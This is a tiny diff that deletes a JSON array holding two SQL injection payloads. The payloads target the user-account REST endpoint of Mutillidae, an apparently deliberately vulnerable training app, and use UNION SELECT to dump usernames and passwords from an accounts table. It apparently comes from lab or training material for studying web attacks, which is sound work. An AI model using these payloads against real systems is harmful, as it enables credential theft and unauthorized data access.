@@ -1,1 +1,0 @@
-["```\n    user'+union+select+concat('The+password+for+',username,\n    '+is+',+password),mysignature+from+accounts+--+\n    ```", "```\n/mutillidae/webservices/rest/ws-user-account.php?username=user'\n+union+select+concat('The+password+for+',username,'+is+',\n+password),mysignature+from+accounts+--+\n```"]
